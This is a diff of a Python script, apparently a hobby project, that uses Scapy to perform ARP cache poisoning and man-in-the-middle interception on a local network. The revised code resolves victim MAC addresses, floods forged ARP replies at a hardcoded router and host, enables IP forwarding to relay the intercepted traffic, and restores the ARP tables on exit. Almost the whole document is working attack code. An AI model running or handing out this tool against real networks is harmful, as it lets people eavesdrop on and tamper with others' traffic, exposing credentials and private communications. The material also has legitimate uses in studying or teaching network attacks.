@@ -1,7 +1,5 @@
-from scapy.all import *
+import scapy.all as scapy
 import os
-
-# specifically MITM attack in this code
 
 # settings:
 def enable_ip_forwarding():
@@ -18,43 +16,63 @@ def disable_ip_forwarding():
 # hwsrc is the MAC corresponding to psrc, to update in the target's arp table
 # hwdst is the MAC corresponding to pdst, to update in the target's arp table
 
-def find_mac_address(ip):
-    packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.arp(pdst = ip) # asking "who has this ip?"
-    answer = scapy.srp(packet, iface=interface, timeout=2, verbose=False)[0]
-    mac_address = answer[1][0].hwsrc
-    return mac_address
+def get_mac(ip):
+    packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = ip) # asking "who has this ip?"
+    reply = scapy.srp(packet, timeout=2, verbose=False)[0]
+    if reply:
+        return reply[0][1].hwsrc
+    return None
  
-def spoof(target, spoofed):
-    packet = scapy.arp(op = 2, hwdst = find_mac_address(target), pdst=target, psrc=spoofed)
-    scapy.send(packet, iface=interface, verbose=False)
-    print(f"Spoofing {target}, pretending to be {spoofed}")
+def find_mac_loop(ip):
+    mac = None
+    while not mac:
+        mac = get_mac(ip)
+    return mac
 
-def restore(victim_ip, source_ip):
-    victim_mac = find_mac_address(victim_ip)
-    source_mac = find_mac_address(source_ip)
-    packet = scapy.arp(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, iface=interface, verbose=False)
-    print(f"Restoring {victim_ip} to its original state.")
+def spoof(target_ip, spoof_ip, target_mac):
+    packet = scapy.ARP(op = 2, hwdst=target_mac, pdst=target_ip, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+    print(f"Spoofing {target_ip}, pretending to be {spoof_ip}")
 
-def run():
+def restore(spoof_ip, target_ip, spoof_mac, target_mac):
+    packet = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip, hwsrc=target_mac)
+    scapy.send(packet, verbose=False)
+    print(f"Restoring {spoof_ip} to its original state.")
+
+def mitm():
     enable_ip_forwarding()
     # attacking:
     print(f"attacking {spoof_ip}...")
     try:
         while True:
-            spoof(target_ip, spoof_ip)
-            spoof(spoof_ip, target_ip)
+            spoof(target_ip, spoof_ip, target_mac)
+            spoof(spoof_ip, target_ip, spoof_mac)
     except Exception:
         # restoring:
-        restore(target_ip, spoof_ip)
-        restore(spoof_ip, target_ip)
+        restore(target_ip, spoof_ip, target_mac, spoof_mac)
+        restore(spoof_ip, target_ip, spoof_mac, target_mac)
+        print("ARP tables restored")
+    
+    disable_ip_forwarding()
+
+def arp_spoofing():
+    enable_ip_forwarding()
+    # attacking:
+    print(f"attacking {spoof_ip}...")
+    try:
+        while True:
+            spoof(target_ip, spoof_ip, target_mac)
+    except Exception:
+        # restoring:
+        restore(target_ip, spoof_ip, target_mac, spoof_mac)
         print("ARP tables restored")
     
     disable_ip_forwarding()
 
 if __name__ == "__main__":
-    target_ip = input("Enter target ip: ") 
-    spoof_ip = input("Enter spoof ip: ") 
-    interface = input("Enter interface: ") 
-    run()
+    target_ip = "192.168.1.1"
+    spoof_ip = "192.168.1.117"
+    target_mac = find_mac_loop(target_ip)
+    spoof_mac = find_mac_loop(spoof_ip)
+    mitm()
     print("Thanks for using my code :)")
